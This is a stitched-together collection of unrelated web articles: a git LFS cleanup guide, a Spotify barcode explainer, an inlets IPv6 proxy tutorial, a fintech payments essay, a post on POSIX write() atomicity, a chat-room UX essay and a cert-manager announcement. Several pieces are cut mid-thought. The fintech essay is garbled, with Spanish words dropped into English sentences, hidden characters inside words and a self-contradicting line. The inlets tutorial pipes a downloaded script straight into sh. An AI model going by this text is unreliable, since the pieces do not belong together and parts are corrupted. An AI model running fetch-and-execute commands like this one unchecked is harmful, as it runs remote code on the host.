<code>git lfs migrate import --include-ref=master --include="*.bz2"</code></li></ul><p id="5f882e5c-d19d-459f-9677-eb3f7f128e09">For more details on how to match your usecase see <a href="https://github.com/git-lfs/git-lfs/wiki/Tutorial#migrating-existing-repository-data-to-lfs">this guide</a>.</p><p id="6095bb85-e0ca-484d-82f8-869c3867f3e7">The downside of using <code>git lfs</code> is that it adds more complexity to the workflow of developers. Decisions need to be made: Which files are to be versioned with git and which with <code>git lfs</code>? Do you decide based on the file size or the file format/extension? The <code>.gitattributes</code> file needs to be maintained etc.</p><p id="27da68da-cd07-4535-8c4f-60b5f5c71462">You get the gist, there is overhead and nobody likes overhead. But if the binary files are really tightly coupled with the code and need to be version, this is the way to go.</p><h2 id="3b7518d8-e554-4a14-a38b-93a34c4caaa9">Pruning and migrating out of git</h2><p id="fc89422d-550b-4a9a-9200-c6f9b104e10f">When the binaries are not tightly coupled with the code there is another solution: simply prune away all the binary files from the repo history and version them in a separate, more appropriate system.</p><p id="6d57c9d1-ebdf-4313-b89d-492fc83326a2">The pruning part is simple thanks to the amazing <a href="https://github.com/newren/git-filter-repo"><code>git filter-repo</code></a> tool. For example, pruning away all the binary files larger than 10 MB can be done using the <a href="https://docs.gitlab.com/ee/user/project/repository/reducing_the_repo_size_using_git.html#repository-cleanup">guide from GitLab</a>. For more elaborate cases please refer to the official <a href="https://htmlpreview.github.io/?https://github.com/newren/git-filter-repo/blob/docs/html/git-filter-repo.html#EXAMPLES">documentation with examples</a>.</p><p id="f4cc1de1-b07e-40c7-9ce7-61d0622baee9">After the pruning, your repo should be very lean, and you are free to version or track the binaries outside of git. For example, in the project I was working on the <a href="https://mlflow.org/"><code>mlflow</code></a> was the appropriate tool we decided on after some trial period. Using the <code>mlflow</code> <a href="https://mlflow.org/docs/latest/python_api/index.html">Python API</a> it was easy to track any artifacts and results along with the meta-data which matched the needs of the project well.</p><p id="03957dad-c639-4d19-b6dd-c83bc9bd6390">The obvious downside is that you lose the history of the binary files. This was the trade-off we were willing to take as the history of the binary files was not very valuable, and we still had access to it in the backups of the repo we made before the prune.</p><p id="76ab4e36-2b97-4d4e-94dd-fd399c6d71a0">Hope this was helpful and you were able to get some useful pointers and links that will help with your git endeavors. Let me know if you found a different solution. Cheers! 🍻</p></div>

I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Let’s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>

This must help in identifying if the barcode is valid. Having the 12th bar as the max height also helps you calculate the ratios of the bar heights. I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave.

</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

            <p>Many users have no IPv6 stack available to them where they run their services, whether at home or in the datacenter. Learn how you can use inlets to serve traffic to IPv6 users</p>

<h2 id="introduction">Introduction</h2>

<p><img src="https://inlets.dev/images/2020-11-ipv6-proxy/top.jpg" alt="Datacenter Networking"></p>

<p>This weekend an <a href="https://inlets.dev/">inlets PRO customer</a> reached out and asked for a new feature in inlets:</p>

<blockquote>
  <p>Please can you add IPv6 support?</p>
</blockquote>

<p>When I asked why, they told me that they were replacing their bespoke solution using Wireguard with inlets PRO. Everything worked as expected, but there was one missing piece. They were running an IPv6 proxy on the public VM so that users could access tunnelled services over IPv6.</p>

<p>After a little digging it transpired that because inlets and inlets PRO are written in <a href="https://golang.org/">Go</a>, that IPv6 was already part of the package and already working. No patches were required, so I wanted to put this post together and show you how you can start exposing traffic to users over IPv6.</p>

<p><img src="https://inlets.dev/images/2020-11-ipv6-proxy/conceptual.png" alt="inlets as an IPv6 Proxy"></p>

<blockquote>
  <p>Conceptual diagram: an inlets exit-server running on a public EC2 instance, using its IPv6 networking stack.</p>
</blockquote>

<h3 id="building-your-own-ipv6-proxy">Building your own IPv6 proxy</h3>

<p>You can use inlets or inlets PRO for this setup. The key is that your exit-server must be on an IaaS or VPS which has IPv6 enabled.</p>

<blockquote>
  <p><a href="https://metal.equinix.com/">Equinix Metal (Packet)</a> is the easiest option available and has IPv6 fully configured in the host OS out of the box.</p>
</blockquote>

<p>All versions of inlets come as static Go binaries, but it’s often easier to use some automation to install them on a cloud host, than to provision the host manually. <a href="https://github.com/inlets/inletsctl">inletsctl</a> sets up a host, generates an auth token and installs a systemd unit file.</p>

<blockquote>
  <p>Did you know? inlets can also be used with Kubernetes and both the client and server components can be used as Pods. The easiest way to get started is with the <a href="https://github.com/inlets/inlets-operator">inlets-operator</a>.</p>
</blockquote>

<p>Install inletsctl and download inlets to your client:</p>

<div><div><pre><code>curl <span>-SLs</span> https://inletsctl.inlets.dev | sh
<span>mv </span>inletsctl /usr/local/bin/

<span>sudo </span>inletsctl download

inlets version
</code></pre></div></div>

<blockquote>
  <p>The user told me that DigitalOcean also has an IPv6 capability, but you need to click to enable it in the dashboard, then within your Operating System. See also: <a href="https://www.digitalocean.com/docs/networking/ipv6/how-to/enable/">How to Enable IPv6 on Droplets</a></p>
</blockquote>

<p>Go to your Equinix Metal dashboard and create an API Key, call it “inletsctl” and give it read/write permissions. Save it to a file: <code>$HOME/api-token-packet.txt</code></p>

<p>Let’s run a server process for our IPv6 clients to connect to. Now if you’re using inlets OSS, then you need to use a HTTP server, but if you’re using inlets PRO you can use a TCP service like RDP or SSH.</p>

<p>Download <a href="https://github.com/openfaas/of-watchdog">the OpenFaaS watchdog</a> which is described as a “Reverse proxy for HTTP microservices and STDIO”</p>

<p>Simply put, it’s an HTTP server which acts a little like cgi-bin. It will run a local command-line process to execute whenever a request comes in. You can also use it with streaming workloads like ffmpeg or HTTP servers like Express.js.</p>

<div><div><pre><code>curl <span>-o</span> of-watchdog <span>-SL</span> https://github.com/openfaas/of-watchdog/releases/download/0.8.1/of-watchdog-darwin
<span>chmod</span> +x of-watchdog
</code></pre></div></div>

<p>You can also download for Windows and Linux here: <a href="https://github.com/openfaas/of-watchdog/releases/tag/0.8.1">watchdog binaries</a></p>

<p>Run <code>of-watchdog</code> so that every HTTP request that comes in triggers the <code>cal</code> command from bash.</p>

<div><div><pre><code><span>mode</span><span>=</span>streaming <span>fprocess</span><span>=</span>cal <span>port</span><span>=</span>8080 ./of-watchdog
</code></pre></div></div>

<p>Test out the server on your local computer:</p>

<div><div><pre><code>curl <span>-s</span> http://localhost:8080

   November 2020      
Su Mo Tu We Th Fr Sa  
 1  2  3  4  5  6  7

15 16 17 18 19 20 21  
22 23 24 25 26 27 28  
29 30
</code></pre></div></div>

<p>Now create an exit-server with inlets and point it at your SimpleHTTPServer:</p>

<div><div><pre><code><span># Set from your dashboard (under "Project settings")</span>
<span>export </span><span>PROJECT_ID</span><span>=</span><span>"66ae0069-7d03-4db5-9af1-6b14036e380a"</span>

inletsctl create <span>--provider</span> packet <span>\</span>
  <span>--access-token-file</span> <span>$HOME</span>/api-token-packet.txt <span>\</span>
  <span>--project-id</span> <span>$PROJECT_ID</span>
</code></pre></div></div>

<p>This command will create a <code>t1.small.x86</code> instance in the <em>ams1</em> region. You can override the region with <code>--region</code>.</p>

<p>You will see the IPv4 address printed out on the console along with connection info:</p>

<div><div><pre><code>Using provider: packet
Requesting host: confident-hamilton3 <span>in </span>ams1, from packet

</code></pre></div></div>

<p>To get the IPv6 address, log into your host over SSH, or open the Equinix Metal dashboard.</p>

<p><img src="https://inlets.dev/images/2020-11-ipv6-proxy/packet-dashboard.png" alt="curl test"></p>

<p>In my instance the address was: <code>2604:1380:2000:b700::5</code></p>

<h3 id="trying-it-out">Trying it out</h3>

<p>Connect your inlets client:</p>

<div><div><pre><code><span>export </span><span>UPSTREAM</span><span>=</span>http://127.0.0.1:8080
inlets client <span>--remote</span> <span>"ws://147.75.33.3:8080"</span> <span>\</span>

    <span>--upstream</span> <span>$UPSTREAM</span>
</code></pre></div></div>

<p>You can use <code>curl</code> to test the IPv6 endpoint, however if your local network does not support IPv6, you’ll need to create another host and run the command there. Most clouds and IaaS platforms support IPv6 out of the box.</p>

<p>Note the brackets around the address:</p>

<div><div><pre><code>curl <span>-v</span> http://[2604:1380:2000:b700::5]:80/
</code></pre></div></div>

<p><img src="https://inlets.dev/images/2020-11-ipv6-proxy/curl-test.png" alt="curl test"></p>

<p>See how to set up TLS for the IPv6 proxy using Caddy and this guide: <a href="https://blog.alexellis.io/expose-grafana-dashboards/">Expose your private Grafana dashboards with TLS</a>.</p>

<p>Try stopping the of-watchdog process and changing the “fprocess” command to something else like <code>wc</code>:</p>

<div><div><pre><code>curl <span>-s</span> http://[2604:1380:2000:b700::5]:80/ <span>\</span>
  <span>--data-binary</span> <span>"How many characters is this</span><span>\?</span><span>"</span>
       0       5      29
</code></pre></div></div>

<p>Try running <code>node</code> and a simple program to gather any input and print it back to the user:</p>

<p>Save <code>app.js</code>:</p>

<div><div><pre><code><span>"</span><span>use strict</span><span>"</span>

<span>let</span> <span>getStdin</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>get-stdin</span><span>'</span><span>);</span>

<span>let</span> <span>handle</span> <span>=</span> <span>(</span><span>req</span><span>)</span> <span>=&gt;</span> <span>{</span>
   <span>console</span><span>.</span><span>log</span><span>(</span><span>`Input was: "</span><span>${</span><span>req</span><span>}</span><span>"`</span><span>);</span>
<span>};</span>

<span>getStdin</span><span>().</span><span>then</span><span>(</span><span>val</span> <span>=&gt;</span> <span>{</span>
   <span>handle</span><span>(</span><span>val</span><span>);</span>
<span>}).</span><span>catch</span><span>(</span><span>e</span> <span>=&gt;</span> <span>{</span>
  <span>console</span><span>.</span><span>error</span><span>(</span><span>e</span><span>.</span><span>stack</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>Install dependenices</p>
<div><div><pre><code>npm init <span>-y</span>
npm i get-stdin <span>--save</span>

<span>mode</span><span>=</span>streaming <span>fprocess</span><span>=</span><span>wc </span><span>port</span><span>=</span>8080 ./of-watchdog
</code></pre></div></div>

<p>Invoke it:</p>

<div><div><pre><code>curl <span>-s</span> http://[2604:1380:2000:b700::5]:80/ <span>--data-binary</span> <span>"There are many proxies, but this one is mine"</span>

Input was: <span>"There are many proxies, but this one is mine"</span>
</code></pre></div></div>

<p>The of-watchdog is just one component of OpenFaaS, and is designed to be used as part of a whole solution including metrics, auto-scaling, dashboards, and much more.

<h2 id="wrapping-up">Wrapping up</h2>

<p>In this tutorial we exposed a local API endpoint on a network with an IPv4 networking stack to public clients to access over IPv6. The IPv6 rollout is coming, but is slow and in the meantime solutions like inlets OSS and inlets PRO provide a way for us to serve traffic clients and to patch the gaps.</p>

<blockquote>
  <p>inlets can be used to create a self-hosted tunnels, but what you’re tunneling can also be kept private by binding to a local ethernet adapter. You can then access your services from the remote LAN, instead of over the Internet. A recent example of that is the post by Johan Siebens where he runs MySQL on-premises on a private network and WordPress on a cloud Kubernetes cluster. <a href="https://inlets.dev/blog/2020/11/06/hybrid-cloud-with-inlets.html">Read more here</a></p>

Fintech’s global market cap is expected to reach $26.5 trillion in 2022 with a CAGR of 6%. The fintech market share across 48 fintech unicorns is now worth over US$187 billion (as of the f​i​r​s​t half of 2019). These are massive numbers and as our world changes rapidly around us, n​e​w financial tools are needed to help meet the needs of our new world. O​n​e area, in particular, we think has a massive change to drive the next generation of Unicorns is payments and related infrastructure, let’s get into why.</p><p>We todo interact with payment technology every day, from swiping our card at the grocery store to ordering DoorDash or an Uber. In order for you and I to easily pay for these, ahí are payments infrastructure on the back-end enabling us to use anything from apple pay to our credit card to PayPal. We aren’t going to go into the mechanism of cómo these systems work because well…quite frankly it's complicated and maddening and I’m pretty sure I know 100% of it. But I do know one thing, there are massive amounts of data flowing through these systems, the perfect source of información to build SaaS services.</p><p>Payment systems sit in a very advantageous position in-between businesses and their customers. From this spot, they are able to see información about both sides, how businesses are pricing and bundling their products, and how and why consumers are buying them. From this vantage point, and with a little data digging, you can easily spot pain points in the process.</p><p>An example, take Stripe, one of the más popular payments and subscription management tools, and the top choice for e-commerce brands. Stripe noticed that merchants were struggling to manage cash between payments from customers and needing liquidity for growth. Using historical datos from Stripe, they could generate an instant offer for a growth loan and then determine a percentage of daily sales that they would capture till the loan is repaid. It’s simple, eficaz and entirely based on data that Stripe readily has available. They found un cliente pain-point and built a SaaS service to address it.</p><p>The future of SaaS is bright for fintech. We are excited to see how different payments platforms turn customer data into products and services that improve the lives of their existing customer base, solve pain-points and even uncover opportunities that no one even knew was there in the primero place.</p><p>A few existing players we have our eye on: <a href="https://stripe.com/" target="_blank">Stripe</a>, <a href="https://paerpay.com/" target="_blank">Paerpay</a>, <a href="https://squareup.com/us/en" target="_blank">Square</a>, <a href="https://www.tangapp.org/" target="_blank">TANG</a>, <a href="https://www.etsy.com/" target="_blank">Etsy</a>, <a href="https://www.pinterest.com/">Pinterest</a>, <a href="https://edge.gg/" target="_blank">Edge</a>, and <a href="https://www.shopify.com/" target="_blank">Shopify</a>.</p></div></div></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>POSIX <code>write()</code> is not atomic in the way that you might like</h2>

	<p><small>November 16, 2020</small></p>
</div><div><p>I was recently reading Evan Jones' <a href="https://www.evanjones.ca/durability-filesystem.html">Durability: Linux File APIs</a>. In this quite
good article, I believe that Jones makes a misstep about what you can
assume about <code>write()</code> (both in POSIX and in practice). I'll start
with a quote from the article:</p>

<blockquote><p>The write system call is defined in the <a href="https://en.wikipedia.org/wiki/POSIX">IEEE POSIX standard</a> as attempting to write data to a
file descriptor. After it successfully returns, reads are required to
return the bytes that were written, even when read or written by other
processes or threads (<a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/write.html#tag_16_685_08">POSIX standard write(); Rationale</a>).
There is an addition note under <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html#tag_15_09_07">Thread Interactions with Regular
File Operations</a>
that says "If two threads each call one of these functions, each call
shall either see all of the specified effects of the other call, or
none of them." This suggests that all file I/O must effectively hold a
lock.</p>

<p>Does that mean write is atomic? Technically, yes: future reads must
return the entire contents of the write, or none of it. [...]</p>
</blockquote>

<p>Unfortunately, that writes are atomic in general is not what POSIX
is saying and even if POSIX tried to say it, it's extremely likely
that no Unix system would actually comply and deliver fully atomic
writes. First off, POSIX's explicit statements about atomicity apply
only in two situations: when anything is writing to a pipe or a
FIFO, or when there are multiple threads in the same process all
performing operations.  What POSIX says about writes interleaved
with reads is much more limited, so let me quote it (emphasis mine):</p>

<blockquote><p>After a <code>write()</code> to a regular file <em>has successfully returned</em>:</p>
<ul><li>Any successful <code>read()</code> from each byte position in the file that was
modified by that write shall return the data specified by the <code>write()</code>
for that position until such byte positions are again modified.</li>
</ul>
</blockquote>

<p>This does not require any specific behavior for <code>read()</code>s on files
that are started by another process before the <code>write()</code> returns
(including ones started before the <code>write()</code> began). If you issue
such a <code>read()</code>, POSIX allows it to see none, some, or all of the
data from the <code>write()</code>. Such a <code>read()</code> is only (theoretically)
atomic if you issue it from another thread within the same process.
This definitely doesn't provide the usual atomicity property that
everyone sees either all of an operation or none of it, since a
cross process <code>read()</code> performed during the <code>write()</code> is allowed
to see partial results.  We would not call a SQL database that
allowed you to see partially complete transactions 'atomic', but
that is what POSIX allows for <code>write()</code> to files.</p>

<p>(It is also what real Unixes almost certainly provide in practice,
although I haven't tested this and there are many situations. For
instance, I wouldn't be surprised if aligned, page-sized writes (or
filesystem block sized ones) were atomic in practice on many Unixes.)</p>

<p>If we think about what it would take to implement atomic file writes
across processes, this should be unsurprising. Since <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/WritesNotShortOften">Unix programs
don't expect short writes on files</a>, we can't
make the problem simpler by limiting how large a write we have to
make atomic and then capping <code>write()</code> to that size; people can ask
us to write megabytes or even gigabytes in a single <code>write()</code> call
and that would have to be atomic. This is too much data to be handled
by gathering it into an internal kernel buffer and then flipping
the visible state of that section of the file in one action.  Instead
this would likely require byte range locking, where <code>write()</code> and
<code>read()</code> lock against each other where their ranges overlap. This
is already a lot of locking activity, since every <code>write()</code> and every
<code>read()</code> would have to participate.</p>

<p>(You could optimize <code>read()</code> from a file that no one has open for
writing, but then it would still need to lock the file so that it
can't be opened for writing until the <code>read()</code> completes.)</p>

<p>But merely locking against <code>read()</code> is not good enough on modern
Unixes, because many programs actually read data by <code>mmap()</code>'ing
files. If you really want <code>write()</code> to be usefully atomic, you must
make these memory mapped reads lock against <code>write()</code> as well, which
requires relatively expensive page table manipulation. Worrying
about <code>mmap()</code> also exposes a related issue, which is that when
people read through memory mapping, <code>write()</code> isn't necessarily
atomic even at the level of individual pages of memory. A reader
using mapped memory may see a page that's half-way through the
kernel's <code>write()</code> copying bytes into it.</p>

<p>(This may happen even with <code>read()</code> and <code>write()</code>, since they may
both access the same page of data from the file in the kernel's
<a href="https://utcc.utoronto.ca/~cks/space/blog/unix/UnifiedBufferCache">buffer cache</a>, but it is probably easier to
lock things there.)</p>

<p>On top of the performance issues, there are fairness issues. If
<code>write()</code> is atomic against <code>read()</code>, a long <code>write()</code> or a long
<code>read()</code> can stall the other side for potentially significant
amounts of time. People do not enjoy slow and delayed <code>read()</code>
and <code>write()</code> operations. This also provides a handy way to DoS
writers of files that you can open for reading; simply set up to
<code>read()</code> the entire file in one go (or as few as possible) over
and over again.</p>

<p>However, much of these costs are because we want cross process
atomic <code>write()</code>s, which means that the kernel must be the one doing
the locking work. Cross thread atomic <code>write()</code> can be implemented
entirely at user level within a single process (provided that the
C library intercepts <code>read()</code> and <code>write()</code> operations when threading
is active). In a lot of cases you can get away with some sort of
simple whole file locking, although the database people will probably
not be happy with you. Fairness and stalls are also much less of an
issue within a single process, because the only person you're hurting
is yourself.</p>

<p>(Most programs do not <code>read()</code> and <code>write()</code> from the same file at
the same time in two threads.)</p>

<p>PS: Note that even writes to pipes and FIFOs are only atomic if
they are small enough; large writes explicitly don't have to be
atomic (and generally aren't on real Unixes). It would be rather
unusual for POSIX to specify limited size atomicity for pipes and
unlimited size atomicity for regular files.</p>

<p>PPS: I would be wary of assuming that any particular Unix actually
fully implemented atomic <code>read()</code> and <code>write()</code> between threads.
Perhaps I'm being cynical, but I would test it first; it seems like
the kind of picky POSIX requirement that people would cut out in
the name of simplicity and speed.</p>

<h2>Rooms As UX Metaphor</h2>
<p>I’ve been thinking a lot this year about Video Games, RPGs, Wargames and computing in general recently. Reading about how tightly they are bound up with one another and their shared origins. Some of this came through in the pre-pandemic days of <a href="https://www.thejaymo.net/2020/02/28/301-2008-role-for-a-thought-leadership-check/">Episode 20-08</a>. Where I was thinking aloud on how DnD, Stats and Simulation fucked up modernity. Some other bits of this will show up in the next <a href="https://www.thejaymo.net/Dimensino/">Dimensino</a> post on my blog about Permissive IPs too.</p>
<p>Anyhoos, This week I’ve been reading the <a href="http://pdf.textfiles.com/books/iftheorybook.pdf">IF Theory Reader</a> (PDF). Edited by K Jackson-Mead J. and R Wheeler. Published in 2011. It is a very niche book about the history, craft and theory of <a href="https://en.wikipedia.org/wiki/Interactive_fiction">Interactive Fiction</a>.&nbsp;It contains some fantastic essays.&nbsp;I recommend the book to anyone who has even a passing interest in Twine games or Interactive Fiction.&nbsp;</p>
<p>I also recently watched Jason Scott’s 2010 film GET LAMP: The Text Adventure Documentary.</p>
<figure></figure>
<p> It’s amazing. It also does a lot to show how D&amp;D, Interactive Fiction and Wargames influenced all virtual worlds.</p>
<p>I’m finding so much value in old books and writing on cyberspace right now. Because they remind me of the excitement and possibility of what the web could have been.&nbsp;</p>
<p>The web we lost.&nbsp;</p>
<p>I’ve just picked up the 1998 book. Hamlet on the <a href="https://mitpress.mit.edu/books/hamlet-holodeck-updated-edition">Holodeck : The Future of Narrative in Cyberspace</a> by Janet H Murray for 3.50 on ebay. And Finite and Infinite Games by James Carse on <a href="https://en.wikipedia.org/wiki/Paul_Czege">Paul Czege</a>‘s recommendation for 3 quid. Bargains. Can’t wait for them to arrive.</p>
<p>The first Interactive Fiction program <a href="https://en.wikipedia.org/wiki/Colossal_Cave_Adventure">Colossal&nbsp;Cave</a> was released in 1975. MUDs or Multi User Dungeons came soon after. By 1978–79, these games were heavy use on various university PLATO systems. They quickly increased in sophistication.&nbsp; 3D graphics, storytelling, user involvement, team play, and depth of objects and monsters in the dungeons etc.</p>
<p>The first chat system was used by the U.S. Government in 1971. Their first use came during President Nixon’s wage-price freeze under Project Delphi. The system was called EMISARI and allowed 10 regional offices to link together in real-time online chat.&nbsp; It was called the party line, after shared telephony circuits.</p>
<p>Its weird to think that real-time chat technology is 50 years old. Email is nearly 60. These technologies are so old, and yet so young. Former boomer colleagues have been moaning on LinkedIn, about using Discord or Slack for the first time all year.</p>
<p>Last month in <a href="https://www.thejaymo.net/2020/10/09/301-2040-abstract-objects/">Episode 20-40 on Abstract Objects</a> I spoke about metaphors and code environments, specifically chat rooms.</p>
<blockquote><p><em>“Chat ‘rooms’ aren’t really rooms in any sense. But I can see why the people that invented them gave them that name. As good a name as any to express and conceptualise there ‘room like’ qualities. Do you think of your group chats as being in kinds of rooms? “</em></p></blockquote>
<p>During my Interactive fiction binge this week. I found the essay <a href="http://www.brasslantern.org/writers/iftheory/roomasmetaphor.html">The Room as Metaphor in Interactive Fiction</a> by Nathan Jerpe. Which speaks to my question about them last month in October.&nbsp;&nbsp;</p>
<p>Rooms as metaphores in IF were in use right up to and including the early Point and Click Lucasarts games. Tim Schafer still uses this teminolgy when referring to locations in virtual worlds that contain puzzles.</p>
<p>Jerpe’s essay interrogates the metaphor of a room when thinking about virtual environments. Lets apply some of the terms Jerpe uses in discussing Interactive Fiction to chat rooms. As the metaphors should hold across environments.</p>
<p>The first heading in the essay is <strong>Tangibility</strong>. Rooms are tangible metaphors as rooms tend to be fully observable by a user within the structure of the code space. Structures that lend themselves well to modularity. Jerpe suggests that with a playwrights eye we might recompose activities that occur in rooms as scenes. Instead of moving from room to room or multiple locations, a room may host a series of scenes.</p>
<p>Activity in group chats generally comes in bursts. If we consider these fluries of activity as scenes, what sort of UX could be developed in chat apps or even zoom rooms with the ide of scenes?</p>
<p>Rooms also have <strong>Spatial vs. Temporal</strong> qualities. Spatial in that activities occur inside of rooms woth clear boundries.&nbsp;</p>
<p>What if chat room UX moved, shifted, or came from nowhere, only to later disappear altogether? A group of friends in a group chat navigating a shifting metaphor.&nbsp;</p>
<p>I’ve always wanted to be able to start sub chats inside the verticality of a chat feed. Like starting a thread in a forum. Little bubbles of sub chats below the surface of the stream.</p>
<p>Another feature of rooms is <strong>Crowdedness</strong>. If you are in as many discords as I am, you’ll be famililer with dropping by a busy channel. Contributing for a bit and then marking everything else as read. Busy chats do have a sense of Crowdedness.&nbsp;</p>
<p>A nother feature of Crowdedness is that an individual’s actions are typically visible for others in the room to witness. I wonder how the sub chats UX I mention would change the experience of a Discord. Or telegram. Less channels probably. Strange topologies.</p>
<p>In the conclusion, in the context of interactive fiction, Jepe notes. Individuals operating inside a room metaphor are locked into the role of <em>the protagonist</em>. But notes this is worth reconsidering.&nbsp;</p>
<p>What would it mean to participate in a group chat where each individual does not consider themselves to be the protagonist or central agent?</p>
<p>Stange new UX’s FTW.</p>
<hr>
<p>The above is the original script I wrote for the episode. It may differ from what ended up in audio due to time constraints.</p>

            <p>We are excited to announce that our donation of the <a href="https://cert-manager.io/">cert-manager</a> project to the <a href="https://www.cncf.io/">Cloud Native Computing Foundation® (CNCF®)</a> <a href="https://www.cncf.io/sandbox-projects/">“Sandbox”</a> has been accepted.</p>
<p>cert-manager automates the management of X.509
machine identities within Kubernetes and OpenShift and has become one of the leading community projects
in the cloud-native ecosystem. The project is now used by companies all across the world and in all sorts of industries, including government departments, large financial institutions, car manufacturers, and retail stores.</p>
<p>It’s exciting to see cert-manager join the CNCF Sandbox. It’s been several
years in the making to <a href="https://blog.jetstack.io/blog/cert-manager-1.0/">get to 1.0</a> and it’s been a pleasure for Jetstack to have supported the team behind
it, working closely with over 260 contributors and many end-users to get it to where it is today. It’s a foundational add-on to many Kubernetes and OpenShift clusters and the project
will benefit being part of the CNCF and its ecosystem that is enabling modern and open cloud native systems for users across the globe.</p>
<h2 id="why-we-are-donating-cert-manager-to-the-cncf">Why we are donating cert-manager to the CNCF</h2>
<p>Cert-manager is widely used; it has a large user base and following, and projects across the ecosystem integrate with it. Jetstack, with the support of our parent company <a href="https://www.venafi.com/">Venafi</a>, believes such a foundational component belongs in the CNCF, with its vendor-neutrality, alongside many of the projects that rely on it and would benefit from a close collaboration. Being part of the CNCF will enable the project to attract a diverse contributor base and help to promote partnership and cooperation with many ecosystem projects, including those in the CNCF.</p>
<h2 id="what-is-cert-manager-and-how-is-it-used">What is cert-manager and how is it used?</h2>
<p><a href="https://cert-manager.io/">cert-manager</a> enables developers to easily request machine identities to secure
applications. Certificates can be signed by public and private certificate
authorities such as Let’s Encrypt and Venafi, and cert-manager handles the
automation of the certificate lifecycle. This means developers can move fast
and stay secure, while platform and security teams have control and visibility.
The popularity of cert manager within the Kubernetes community and its utility
in a wide range of projects makes cert-manager an ideal project for the CNCF.</p>
<p>The most common use case for cert-manager is requesting TLS signed certificates to <a href="https://cert-manager.io/docs/usage/ingress/">secure Ingress resources</a>. It can also be used programmatically by Kubernetes-native applications, as well as via the CSI driver to provide certificates on disk for the likes of intra-pod mTLS and more legacy applictions. Read more about how to <a href="https://cert-manager.io/docs/installation/">get started</a> and <a href="https://cert-manager.io/docs/usage/">usage</a> at the <a href="https://cert-manager.io/docs">cert-manager documentation</a>.</p>

<p>A <em>huge</em> thank you to all that have been involved in getting
cert-manager to where it is today! A special thanks to <a href="https://twitter.com/JamesMunnelly">James Munnelly</a>, who had the foresight to build and architect the project and
grow the community to where it is today, including a team of Jetstack engineers and 260+ contributors!</p>
<h2 id="whats-coming-in-the-future">What’s coming in the future</h2>
